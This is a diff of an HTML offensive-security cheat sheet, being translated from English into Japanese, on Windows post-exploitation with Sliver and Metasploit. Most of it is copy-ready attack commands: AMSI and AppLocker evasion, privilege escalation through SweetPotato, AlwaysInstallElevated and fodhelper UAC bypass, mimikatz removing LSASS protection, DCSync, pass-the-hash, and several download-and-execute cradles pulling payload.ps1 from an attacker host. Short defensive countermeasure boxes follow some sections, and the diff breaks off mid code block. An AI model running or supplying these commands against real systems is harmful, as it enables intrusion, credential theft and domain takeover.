+sharpsh -t 200 -- <span class="s">'-u http://&lt;LHOST&gt;/PowerUp.ps1 -c 1'</span>
+
+<span class="c"># 引数付き実行</span>
+sharpsh -t 20 -- <span class="s">'-u http://&lt;LHOST&gt;/PowerUp.ps1 -c "Invoke-AllChecks"'</span>
+sharpsh -t 200 -- <span class="s">'-u http://&lt;LHOST&gt;/HostRecon.ps1 -c "Invoke-HostRecon"'</span>
+
+<span class="c"># 引用符を大量含むコマンドは base64 化 (-e -c) で渡す</span>
+sharpsh -- -e -c <span class="v">&lt;BASE64_COMMAND&gt;</span>
+
+<span class="c"># 256 文字超のコマンドは in-process (-i) で実行</span>
+sharpsh -i -t 40 -- -u <span class="s">'http://&lt;LHOST&gt;/Invoke-Mimikatz.ps1'</span> -e -c <span class="v">&lt;BASE64_COMMAND&gt;</span></code></pre></div>
+
+      <h3>Stracciatella — unmanaged PowerShell runspace</h3>
+      <p>Stracciatella は AMSI/ScriptBlockLogging が触れない unmanaged runspace で PowerShell を実行する。SharpSh と同じ引数体系。CLM 有効環境で FullLanguage を得たいときに有用。</p>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code>execute-assembly -i <span class="v">&lt;TOOL_DIR&gt;</span>/Stracciatella.exe \
+  -c <span class="s">"$ExecutionContext.SessionState.LanguageMode"</span></code></pre></div>
+
+      <h3>Application Whitelisting — execute-assembly modes</h3>
+      <p>Sliver は C# バイナリを implant プロセス内で走らせる 2 系統を持つ。<code>execute-assembly -i</code> は sacrificial process を作らず inline で実行 (最も静か)、<code>inline-execute-assembly</code> は BOF 相当の実装。両者とも AppLocker が .exe 実行を制限している環境で assembly を通過させる。</p>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code><span class="c"># execute-assembly — armory alias 経由</span>
+sharpup -- audit
+sharpup -i -- audit
+execute-assembly -i -- <span class="v">&lt;TOOL_DIR&gt;</span>/SharpUp.exe audit
+
+<span class="c"># inline-execute-assembly (BOF)</span>
+inline-execute-assembly <span class="v">&lt;TOOL_DIR&gt;</span>/SharpUp.exe audit</code></pre></div>
+
+      <div class="note"><span class="lbl">note</span>AMSI patch / CLM bypass / AppLocker の LOLBAS 手法は evasion sheet で機序解説あり。ここではあくまで「Sliver からどう呼ぶか」に絞る。Metasploit は AMSI 対策を base 機能に持たないため、PowerShell Empire 由来の技法 (<code>set AutoRunScript post/windows/manage/killav</code> 等) で個別回避する構成になる。</div>
+
+      <div class="defense"><span class="lbl">防御 / countermeasures</span>
+        <ul>
+          <li>PowerShell ScriptBlockLogging (EID 4104) と ModuleLogging を全 endpoint で有効化。Stracciatella は unmanaged pipeline で回避するが、それ自体の binary sig は EDR で拾える。</li>
+          <li>WDAC / AppLocker policy で .NET assembly の execute-from-memory も拒否 (単純 .exe 拒否では execute-assembly 系を止められない)。</li>
+          <li>AMSI provider の integrity 監視 — patch されているかどうか自体を検知。</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s06" class="reveal">
+      <h2><span class="num">06</span>Privilege Escalation<span class="jp">権限昇格</span></h2>
+      <p>安定した低権限 session が取れたら昇格経路を列挙する。Sliver は C# assembly を in-process 実行 (<code>execute-assembly -i</code>) または sideload、PowerShell スクリプトは SharpSh で AMSI bypass しながら投入する。Metasploit の <code>local_exploit_suggester</code> はカーネル脆弱性、専用モジュールは SeImpersonate / UAC を担当する。</p>
+
+      <h3>列挙 — Sliver</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code><span class="c"># Identity / privileges (BOF で静かに)</span>
 sa-whoami
 execute -o whoami /all
 
@@ -357,35 +421,38 @@ execute -o whoami /all
 seatbelt -- -group=all
 seatbelt -- -group=user
 
-<span class="c"># SharpUp — Windows privesc audit</span>
+<span class="c"># SharpUp — Windows privesc 監査</span>
 sharpup -- audit
 sharpup -i -- audit
 
 <span class="c"># PowerUp via SharpSh</span>
 sharpsh -t 40 -- <span class="s">'-u http://&lt;LHOST&gt;/PowerUp.ps1 -c "Invoke-AllChecks"'</span>
 
-<span class="c"># winPEAS via SharpSh (long-running, 400s timeout)</span>
-sharpsh -t 400 -- <span class="s">'-u http://&lt;LHOST&gt;/winPEAS.ps1 -c 1'</span></code></pre></div>
+<span class="c"># winPEAS via SharpSh (400s timeout の長尺)</span>
+sharpsh -t 400 -- <span class="s">'-u http://&lt;LHOST&gt;/winPEAS.ps1 -c 1'</span>
 
-      <h3>Enumeration — Metasploit</h3>
+<span class="c"># レジストリ経由の autologon 確認</span>
+reg query <span class="s">"HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"</span></code></pre></div>
+
+      <h3>列挙 — Metasploit</h3>
       <div class="code"><div class="code-bar"><span class="code-lang">msfconsole</span><button class="copy">copy</button></div><pre><code><span class="k">msf6</span> &gt; use post/multi/recon/local_exploit_suggester
 <span class="k">msf6</span> &gt; set SESSION <span class="v">&lt;id&gt;</span>
 <span class="k">msf6</span> &gt; run
 
-<span class="c"># Windows-specific privilege enumeration</span>
+<span class="c"># Windows 固有の privilege enumeration</span>
 <span class="k">msf6</span> &gt; use post/windows/gather/win_privs
 <span class="k">msf6</span> &gt; use post/windows/gather/enum_patches</code></pre></div>
 
       <h3>Modifiable Service</h3>
-      <p>A misconfigured service whose ACL allows non-admin to modify <code>binPath</code> is exploited by rewriting the binary path to add the current user to <em>Administrators</em>, then restarting the service under SYSTEM.</p>
+      <p>非 admin が <code>binPath</code> を変更できるサービスを悪用する。service バイナリを「現ユーザを Administrators に追加するコマンド」に書き換え、サービス再起動時に SYSTEM 権限で実行させる。</p>
 
-      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code><span class="c"># Inspect and rewrite service config (SNMPTRAP is a common misconfig example)</span>
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code><span class="c"># サービス構成の確認と書き換え (SNMPTRAP は典型的な misconfig 例)</span>
 execute -o sc qc <span class="v">&lt;SERVICE_NAME&gt;</span>
 execute -o sc config <span class="v">&lt;SERVICE_NAME&gt;</span> binPath= <span class="s">"net localgroup Administrators domain.com\\<span class="v">&lt;USER&gt;</span> /add"</span> obj= <span class="s">"NT AUTHORITY\\SYSTEM"</span>
 execute -o sc config <span class="v">&lt;SERVICE_NAME&gt;</span> start= auto
 execute -o sc start <span class="v">&lt;SERVICE_NAME&gt;</span>
 
-<span class="c"># Verify local admin membership</span>
+<span class="c"># local admins メンバシップ検証</span>
 execute -o net localgroup administrators</code></pre></div>
 
       <div class="code"><div class="code-bar"><span class="code-lang">msfconsole</span><button class="copy">copy</button></div><pre><code><span class="k">msf6</span> &gt; use exploit/windows/local/service_permissions
@@ -393,54 +460,54 @@ execute -o net localgroup administrators</code></pre></div>
 <span class="k">msf6</span> &gt; run</code></pre></div>
 
       <h3>SeImpersonate — SweetPotato</h3>
-      <p>Any process holding <code>SeImpersonatePrivilege</code> (e.g., IIS worker, MSSQL service) can be leveraged via *Potato variants. SweetPotato with EfsRpc is reliable on modern Windows Server. Encode the payload with donut → inject via <code>execute-shellcode</code>.</p>
+      <p><code>SeImpersonatePrivilege</code> 保持プロセス (IIS worker, MSSQL service 等) は *Potato 系で悪用可能。SweetPotato + EfsRpc モードが最新 Windows Server で最も reliable。donut で PIC 化してから <code>execute-shellcode</code> に食わせる。</p>
 
-      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># Convert SweetPotato.exe to position-independent shellcode via donut</span>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># SweetPotato.exe を PIC shellcode に変換 (donut)</span>
 donut -i <span class="v">&lt;TOOL_DIR&gt;</span>/SweetPotato.exe -a 2 -b 2 \
   -p <span class="s">"-p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a \"IEX((New-Object Net.WebClient).DownloadString('http://<span class="v">&lt;LHOST&gt;</span>/payload.ps1'))\""</span> \
   -o <span class="v">&lt;TOOL_DIR&gt;</span>/SweetPotato.bin
 
-<span class="c"># EfsRpc variant (more reliable when default fails)</span>
+<span class="c"># EfsRpc variant (default モードが不発なとき)</span>
 donut -i <span class="v">&lt;TOOL_DIR&gt;</span>/SweetPotato.exe -a 2 -b 2 \
   -p <span class="s">"-e EfsRpc -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a \"IEX((New-Object Net.WebClient).DownloadString('http://<span class="v">&lt;LHOST&gt;</span>/payload.ps1'))\""</span> \
   -o <span class="v">&lt;TOOL_DIR&gt;</span>/SweetPotato.bin</code></pre></div>
 
-      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code><span class="c"># Sacrificial process + inject SweetPotato shellcode (recommended)</span>
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code><span class="c"># 犠牲プロセス + SweetPotato shellcode inject (推奨)</span>
 execute notepad
 ps -e notepad
 execute-shellcode -S -r -I 30 -p <span class="v">&lt;PID&gt;</span> <span class="v">&lt;TOOL_DIR&gt;</span>/SweetPotato.bin
 
-<span class="c"># In-process variant (faster but less stable)</span>
+<span class="c"># in-process 版 (速いが安定性劣る)</span>
 execute-shellcode -i -S -r -I 30 <span class="v">&lt;TOOL_DIR&gt;</span>/SweetPotato.bin
 
-<span class="c"># Direct assembly execution</span>
+<span class="c"># 直接 assembly 実行</span>
 execute-assembly <span class="v">&lt;TOOL_DIR&gt;</span>/SweetPotato.exe \
   -p C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe \
   -a <span class="s">"-ep bypass -nop iex (New-Object Net.WebClient).DownloadString('http://&lt;LHOST&gt;/payload.ps1')"</span>
 
-<span class="c"># Immediately hollow the shell into svchost (AV kills SweetPotato host quickly)</span>
+<span class="c"># shell 確立後は即座に svchost hollowing (SweetPotato host は AV で殺される)</span>
 hollow svchost.exe <span class="v">&lt;PAYLOAD_PATH&gt;</span>/payload.x64.bin</code></pre></div>
 
-      <div class="code"><div class="code-bar"><span class="code-lang">msfconsole</span><button class="copy">copy</button></div><pre><code><span class="c"># MSF equivalent — juicy potato (older Windows) or getsystem (varies)</span>
+      <div class="code"><div class="code-bar"><span class="code-lang">msfconsole</span><button class="copy">copy</button></div><pre><code><span class="c"># MSF 等価 — juicy potato (旧 Windows) or getsystem (状況次第)</span>
 <span class="k">msf6</span> &gt; use exploit/windows/local/ms16_075_reflection_juicy
 <span class="k">msf6</span> &gt; set SESSION <span class="v">&lt;id&gt;</span>
 <span class="k">msf6</span> &gt; run
 
-meterpreter &gt; getsystem   <span class="c"># tries token duplication / named pipe / rotten potato</span></code></pre></div>
+meterpreter &gt; getsystem   <span class="c"># token 複製 / named pipe / rotten potato を試行</span></code></pre></div>
 
       <h3>AlwaysInstallElevated</h3>
-      <p>When both <code>HKLM\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</code> and its HKCU counterpart are set to 1, any MSI runs as SYSTEM. Build an MSI wrapping the implant EXE with <code>wixl</code> from the MSI-AlwaysInstallElevated template, then <code>msiexec /qn /i http://...</code>.</p>
+      <p><code>HKLM\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</code> と HKCU の対応が両方 1 なら任意 MSI が SYSTEM で走る。MSI-AlwaysInstallElevated テンプレートで implant EXE を wrap し、<code>msiexec /qn /i http://...</code> でロードする。</p>
 
       <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code>sudo apt install wixl
 cd ~/tools
 git clone https://github.com/KINGSABRI/MSI-AlwaysInstallElevated
 cd MSI-AlwaysInstallElevated
 
-<span class="c"># Drop the Sliver .exe implant into cwd</span>
+<span class="c"># Sliver .exe implant を cwd に置く</span>
 cp <span class="v">&lt;PAYLOAD_PATH&gt;</span>/payload.x64.exe .
 
-<span class="c"># Edit WXS-Templates/alwaysInstallElevated-3.wxs line 15:</span>
-<span class="c"># Change  Source="setup.exe"  →  Source="payload.x64.exe"</span>
+<span class="c"># WXS-Templates/alwaysInstallElevated-3.wxs の line 15 を編集:</span>
+<span class="c">#   Source="setup.exe"  →  Source="payload.x64.exe"</span>
 
 wixl -v WXS-Templates/alwaysInstallElevated-3.wxs -o alwaysInstallElevated.msi
 sudo cp alwaysInstallElevated.msi /var/www/html
@@ -453,7 +520,7 @@ sudo chmod 644 /var/www/html/alwaysInstallElevated.msi</code></pre></div>
 <span class="k">msf6</span> &gt; run</code></pre></div>
 
       <h3>UAC Bypass — Fodhelper / ComputerDefaults</h3>
-      <p>Auto-elevate binaries (<code>fodhelper.exe</code>, <code>ComputerDefaults.exe</code>) load handlers from HKCU without UAC prompt. Plant a registry key pointing to your payload, then launch the binary. Ideal to disable Defender first; the bypass itself is user-level.</p>
+      <p>Auto-elevate バイナリ (<code>fodhelper.exe</code>, <code>ComputerDefaults.exe</code>) は HKCU からハンドラを load するため UAC prompt を経由しない。payload を指すレジストリキーを植えて対象バイナリを起動する。Defender を先に無効化しておくと安定する (bypass 自体は user 権限で完結)。</p>
 
       <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code><span class="c"># ComputerDefaults variant</span>
 sharpsh -- -c <span class="s">'New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force'</span>
@@ -461,12 +528,12 @@ sharpsh -- -c <span class="s">'New-ItemProperty "HKCU:\software\classes\ms-setti
 execute -o powershell <span class="s">'Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "C:\Windows\System32\cmd.exe /c powershell -w hidden -c &lt;stager&gt;" -Force'</span>
 execute -o powershell <span class="s">'Start-Process "C:\Windows\System32\ComputerDefaults.exe"'</span>
 
-<span class="c"># Verify elevation</span>
+<span class="c"># 昇格確認</span>
 execute -o whoami /priv
 sa-whoami
 getsystem</code></pre></div>
 
-      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code><span class="c"># Fodhelper variant (equivalent registry, different auto-elevate binary)</span>
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code><span class="c"># Fodhelper variant (レジストリ構造は同一、起動対象が違う)</span>
 sharpsh -- -c <span class="s">'New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "powershell.exe (iwr http://&lt;LHOST&gt;/payload.ps1 -usebasicparsing) | IEX" -Force'</span>
 sharpsh -- -c <span class="s">'New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force'</span>
 execute -o powershell <span class="s">'Start-Process "C:\Windows\System32\fodhelper.exe"'</span></code></pre></div>
@@ -477,27 +544,383 @@ execute -o powershell <span class="s">'Start-Process "C:\Windows\System32\fodhel
 <span class="k">msf6</span> &gt; set LHOST <span class="v">&lt;LHOST&gt;</span>
 <span class="k">msf6</span> &gt; run
 
-<span class="c"># Alternates</span>
+<span class="c"># 別 UAC bypass 手段</span>
 <span class="k">msf6</span> &gt; use exploit/windows/local/bypassuac_comhijack
 <span class="k">msf6</span> &gt; use exploit/windows/local/bypassuac_eventvwr
 <span class="k">msf6</span> &gt; use exploit/windows/local/bypassuac_sdclt</code></pre></div>
 
       <div class="defense"><span class="lbl">防御 / countermeasures</span>
         <ul>
-          <li>Service ACL audit: <code>Get-Acl</code> on all services, alerting on non-admin write permissions.</li>
-          <li><code>SeImpersonatePrivilege</code> only granted to expected accounts (LOCAL SERVICE, NETWORK SERVICE, IIS AppPool, MSSQL); anything else on a workstation is suspicious.</li>
-          <li>Disable AlwaysInstallElevated in Group Policy (default is disabled — its presence in HKLM is the misconfig).</li>
-          <li>UAC bypass detection: monitor HKCU registry writes to <code>ms-settings\shell\open\command</code> and unusual launches of fodhelper / ComputerDefaults from user context.</li>
+          <li>サービス ACL 監査 — 全サービスに <code>Get-Acl</code> を走らせ、非 admin の write 権限を洗い出す。</li>
+          <li><code>SeImpersonatePrivilege</code> の保有主体を LOCAL SERVICE / NETWORK SERVICE / IIS AppPool / MSSQL などの想定アカウントに限定。workstation 上でそれ以外なら要調査。</li>
+          <li>GPO で AlwaysInstallElevated を明示 disable (デフォルト disabled で、HKLM への enable キーの存在自体が misconfig)。</li>
+          <li>UAC bypass 検知: HKCU の <code>ms-settings\shell\open\command</code> への write と、user context での fodhelper / ComputerDefaults 起動を SIEM で警戒。</li>
         </ul>
       </div>
     </section>
 
-    <section id="s06" class="reveal">
-      <h2><span class="num">06</span>Lateral Movement<span class="jp">横展開</span></h2>
-      <p>After privesc and credential access (see <a href="ad-compromise.html">ad-compromise</a>), pivot to adjacent hosts. Sliver's <code>jump-*</code> family provides one-liner beacon delivery; <code>psexec</code> is legacy but reliable; BOFs (<code>sa-whoami</code>) enumerate quietly on remote hosts. Metasploit uses <code>exploit/windows/smb/psexec</code> and its variants.</p>
+    <section id="s07" class="reveal">
+      <h2><span class="num">07</span>Credentials Dumping<span class="jp">認証情報取得</span></h2>
+      <p>Elevated セッションを得たら LSASS / SAM / DPAPI / vault / ブラウザ / 履歴といった credential store を取り出す。Sliver からは mimikatz を execute-assembly 経由で流すか、SharpKatz / LaZagne を assembly 実行する。Metasploit は <code>hashdump</code>, <code>kiwi</code>, <code>post/windows/gather/credentials/*</code> 系がベース。手法は <a href="ad-compromise.html#s02">ad-compromise s02</a> と重複する部分あり、そちらは詳細解説寄り、こちらは Sliver / MSF での実行方法に絞る。</p>
 
-      <h3>Sliver — BOF enumeration on remote context</h3>
-      <p>BOFs execute inline in the implant process — no new process, no <code>whoami.exe</code> spawning, much quieter for EDR.</p>
+      <h3>Mimikatz — LSA 保護解除 (RunAsPPL 対策)</h3>
+      <p>Windows 10 以降デフォルトで LSASS が PPL (Protected Process Light) 保護される。<code>mimidrv.sys</code> を upload して mimikatz のドライバ機能で保護を解除してから <code>sekurlsa</code> を回す。</p>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code><span class="c"># mimikatz と同じディレクトリに mimidrv.sys を upload</span>
+upload <span class="v">&lt;TOOL_DIR&gt;</span>/mimidrv.sys c:/windows/temp/mimidrv.sys
+cd c:/windows/temp/
+ls
+
+<span class="c"># mimidrv ドライバをロードし LSASS の PPL を除去</span>
+mimikatz <span class="s">'"privilege::debug" "token::elevate" "!+" "!processprotect /process:lsass.exe /remove"'</span></code></pre></div>
+
+      <h3>Mimikatz — machine credentials 抽出</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code><span class="c"># LSASS dump</span>
+mimikatz <span class="s">"token::elevate"</span> <span class="s">"sekurlsa::logonpasswords"</span> <span class="s">"exit"</span>
+mimikatz <span class="s">"token::elevate"</span> <span class="s">"sekurlsa::dpapi"</span> <span class="s">"exit"</span>
+mimikatz <span class="s">"token::elevate"</span> <span class="s">"sekurlsa::ekeys"</span> <span class="s">"exit"</span>
+mimikatz <span class="s">"token::elevate"</span> <span class="s">"sekurlsa::wdigest"</span> <span class="s">"exit"</span>
+
+<span class="c"># SAM / Secrets / Cache</span>
+mimikatz <span class="s">"token::elevate"</span> <span class="s">"lsadump::sam"</span> <span class="s">"exit"</span>
+mimikatz <span class="s">"token::elevate"</span> <span class="s">"lsadump::secrets"</span> <span class="s">"exit"</span>
+mimikatz <span class="s">"token::elevate"</span> <span class="s">"lsadump::cache"</span> <span class="s">"exit"</span>
+
+<span class="c"># Vault dump</span>
+mimikatz <span class="s">'"token::elevate" "vault::list" "exit"'</span>
+mimikatz <span class="s">'"token::elevate" "vault::cred /patch" "exit"'</span></code></pre></div>
+
+      <h3>PEZor — Mimikatz を C# assembly 化して execute-assembly</h3>
+      <p>PEZor は PE を .NET dotnet フォーマットに変換 + unhook + antidebug で wrap する。事前に mimikatz 引数を埋め込んでおき、Sliver 側は <code>execute-assembly</code> で一発起動できる。armory の <code>mimikatz</code> alias が非効かない環境で有効。</p>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># PEZor でエンコード (LSA 解除 + logonpasswords を予約)</span>
+PEzor -unhook -antidebug -fluctuate=NA -format=dotnet -sleep=5 \
+  <span class="v">&lt;TOOL_DIR&gt;</span>/mimikatz.exe -z 2 \
+  -p <span class="s">'"privilege::debug" "token::elevate" "!+" "!processprotect /process:lsass.exe /remove" "sekurlsa::logonpasswords" "exit"'</span></code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code>execute-assembly <span class="v">&lt;TOOL_DIR&gt;</span>/mimikatz.exe.packed.dotnet.exe</code></pre></div>
+
+      <h3>LaZagne — ローカル資格情報総ざらい</h3>
+      <p>LaZagne はブラウザ / メール / SSH / WiFi など複数プロダクトの credential store をまとめて dump する。Python 由来の PyInstaller バンドルなので defender が触りやすい — 実行前に AV を無効化する。</p>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code>upload <span class="v">&lt;TOOL_DIR&gt;</span>/LaZagne.exe
+
+execute -o LaZagne.exe
+execute -o LaZagne.exe all -v</code></pre></div>
+
+      <h3>impacket-secretsdump (external / tunneled)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># local admin ハッシュ (PtH)</span>
+impacket-secretsdump ./Administrator@<span class="v">&lt;TARGET&gt;</span> \
+  -hashes ':<span class="v">&lt;NTLM&gt;</span>' \
+  -dc-ip <span class="v">&lt;DC_IP&gt;</span> -target-ip <span class="v">&lt;TARGET_IP&gt;</span>
+
+<span class="c"># 認証情報使用</span>
+impacket-secretsdump <span class="v">&lt;DOMAIN&gt;</span>/<span class="v">&lt;USER&gt;</span>:<span class="s">'<span class="v">&lt;PASSWORD&gt;</span>'</span>@<span class="v">&lt;TARGET&gt;</span> -dc-ip <span class="v">&lt;DC_IP&gt;</span></code></pre></div>
+
+      <h3>NetExec (nxc) — spray + dump</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># kerberos ticket + DCSync + 各種 dump 一括</span>
+nxc smb <span class="v">&lt;DC&gt;</span> --use-kcache --sam --lsa --dpapi -M ntdsutil
+
+<span class="c"># 特定ユーザの DCSync</span>
+nxc smb <span class="v">&lt;DC&gt;</span> -d <span class="v">&lt;DOMAIN&gt;</span> -u <span class="v">&lt;USER&gt;</span> -p <span class="s">'<span class="v">&lt;PASSWORD&gt;</span>'</span> --ntds --user krbtgt
+nxc smb <span class="v">&lt;DC&gt;</span> -d <span class="v">&lt;DOMAIN&gt;</span> -u <span class="v">&lt;USER&gt;</span> -p <span class="s">'<span class="v">&lt;PASSWORD&gt;</span>'</span> --ntds --user Administrator</code></pre></div>
+
+      <h3>SharpKatz — 特定ユーザ限定 DCSync (assembly)</h3>
+      <p>ドメイン名を user 前に明示することが必須。実行時間が短く、mimikatz よりも silent。</p>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code><span class="c"># LSASS dump</span>
+execute-assembly <span class="v">&lt;TOOL_DIR&gt;</span>/SharpKatz.exe --Command logonpasswords
+execute-assembly <span class="v">&lt;TOOL_DIR&gt;</span>/SharpKatz.exe --Command ekeys
+
+<span class="c"># DCSync</span>
+execute-assembly <span class="v">&lt;TOOL_DIR&gt;</span>/SharpKatz.exe --Command dcsync --Domain <span class="v">&lt;DOMAIN&gt;</span>
+execute-assembly <span class="v">&lt;TOOL_DIR&gt;</span>/SharpKatz.exe --Command dcsync --Domain <span class="v">&lt;DOMAIN&gt;</span> --DomainController <span class="v">&lt;DC&gt;</span>
+
+<span class="c"># write 権限がない機上での DCSync — user 明示</span>
+execute-assembly <span class="v">&lt;TOOL_DIR&gt;</span>/SharpKatz.exe --Command dcsync \
+  --User <span class="v">&lt;DOMAIN&gt;</span>\\Administrator --Domain <span class="v">&lt;DOMAIN&gt;</span> --DomainController <span class="v">&lt;DC&gt;</span></code></pre></div>
+
+      <h3>Password / Hash / Ticket Spraying (nxc)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># domain user credential</span>
+nxc smb <span class="v">&lt;TARGET_SUBNET/24&gt;</span> -d <span class="v">&lt;DOMAIN&gt;</span> -u <span class="v">&lt;USER&gt;</span> -p <span class="v">&lt;PASSWORD&gt;</span>
+nxc winrm <span class="v">&lt;TARGET_SUBNET/24&gt;</span> -d <span class="v">&lt;DOMAIN&gt;</span> -u <span class="v">&lt;USER&gt;</span> -H <span class="v">&lt;NTLM&gt;</span>
+
+<span class="c"># local admin</span>
+nxc smb <span class="v">&lt;TARGET_SUBNET/24&gt;</span> -d . -u Administrator -H <span class="v">&lt;NTLM&gt;</span>
+
+<span class="c"># shares 列挙</span>
+nxc smb <span class="v">&lt;TARGET_SUBNET/24&gt;</span> -d <span class="v">&lt;DOMAIN&gt;</span> -u <span class="v">&lt;USER&gt;</span> -p <span class="v">&lt;PASSWORD&gt;</span> --shares
+
+<span class="c"># ticket spraying (kcache)</span>
+nxc smb <span class="v">&lt;TARGET_SUBNET/24&gt;</span> --use-kcache
+
+<span class="c"># atexec は defender 有無に強い、コマンド実行 fallback</span>
+nxc smb <span class="v">&lt;TARGET&gt;</span> -d <span class="v">&lt;DOMAIN&gt;</span> -u <span class="v">&lt;USER&gt;</span> -H <span class="v">&lt;NTLM&gt;</span> \
+  --exec-method atexec -x <span class="s">'powershell -w hidden -enc &lt;BASE64_PAYLOAD&gt;'</span></code></pre></div>
+
+      <h3>Metasploit — creds 取得系</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">meterpreter</span><button class="copy">copy</button></div><pre><code><span class="c"># SAM hash dump (SYSTEM 必要)</span>
+meterpreter &gt; hashdump
+
+<span class="c"># kiwi (mimikatz port)</span>
+meterpreter &gt; load kiwi
+meterpreter &gt; creds_all
+meterpreter &gt; lsa_dump_sam
+meterpreter &gt; lsa_dump_secrets</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">msfconsole</span><button class="copy">copy</button></div><pre><code><span class="c"># post gather module 群</span>
+<span class="k">msf6</span> &gt; use post/windows/gather/credentials/credential_collector
+<span class="k">msf6</span> &gt; use post/windows/gather/credentials/mssql_local_hashdump
+<span class="k">msf6</span> &gt; use post/windows/gather/credentials/domain_hashdump
+<span class="k">msf6</span> &gt; use post/windows/gather/lsa_secrets
+<span class="k">msf6</span> &gt; use post/windows/gather/enum_dpapi_creds</code></pre></div>
+
+      <div class="defense"><span class="lbl">防御 / countermeasures</span>
+        <ul>
+          <li>LSA Protection (RunAsPPL) を全 endpoint 有効化 — mimidrv 経由の解除は要 admin かつ Sysmon で確実に記録される (EID 6 driver load、EID 13 registry set)。</li>
+          <li>Credential Guard 導入で LSASS 内 secrets を hypervisor 隔離 (Windows 10 Enterprise 以降)。</li>
+          <li>LSASS への OpenProcess (PROCESS_VM_READ) を Sysmon EID 10 で監視、target=lsass.exe を全件警告対象に。</li>
+          <li>DCSync 検知 — DC 上で <code>DS-Replication-Get-Changes-All</code> 権限保有者を最小化、SIEM で該当 Directory Service Access (EID 4662) を監視。</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s08" class="reveal">
+      <h2><span class="num">08</span>Token Ops<span class="jp">トークン操作</span></h2>
+      <p>取得した credential / hash / ticket を活用して他ユーザ / 他マシンへ authentication する。Sliver は <code>make-token</code>, <code>rubeus createnetonly</code>, mimikatz 経由の PtH をサポート、SharpImpersonation で他ユーザプロセスを乗っ取れる。Metasploit は <code>incognito</code> + token 操作モジュールが担当。</p>
+
+      <h3>Pass-the-Hash (mimikatz sekurlsa::pth)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code><span class="c"># local user として PTH</span>
+mimikatz <span class="s">'"privilege::debug" "sekurlsa::pth /user:Administrator /domain:. /ntlm:<span class="v">&lt;NTLM&gt;</span>" "exit"'</span>
+mimikatz <span class="s">'"privilege::debug" "sekurlsa::pth /user:Administrator /domain:<span class="v">&lt;MACHINE&gt;</span> /ntlm:<span class="v">&lt;NTLM&gt;</span>" "exit"'</span>
+
+<span class="c"># domain user として PTH</span>
+mimikatz <span class="s">'"privilege::debug" "sekurlsa::pth /user:<span class="v">&lt;USER&gt;</span> /domain:<span class="v">&lt;DOMAIN&gt;</span> /ntlm:<span class="v">&lt;NTLM&gt;</span>" "exit"'</span>
+
+<span class="c"># 生成された process へ migrate</span>
+migrate -p <span class="v">&lt;PID&gt;</span>
+
+<span class="c"># admin$ 共有アクセス確認</span>
+ls //<span class="v">&lt;TARGET&gt;</span>/c$
+
+<span class="c"># psexec による横展開</span>
+psexec -d <span class="v">&lt;SVC_TITLE&gt;</span> -s <span class="v">&lt;SVC_DESC&gt;</span> -p svc-lateral <span class="v">&lt;TARGET&gt;</span></code></pre></div>
+
+      <h3>PtH — SharpNamedPipePTH (assembly ベース)</h3>
+      <p>Named pipe 経由の pass-the-hash 実装。mimikatz と違い LSASS を直接触らないため EDR 検知に強い。cmd や powershell を hash 認証で spawn できる。</p>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code><span class="c"># cmd.exe を起動</span>
+execute-assembly <span class="v">&lt;TOOL_DIR&gt;</span>/SharpNamedPipePTH.exe \
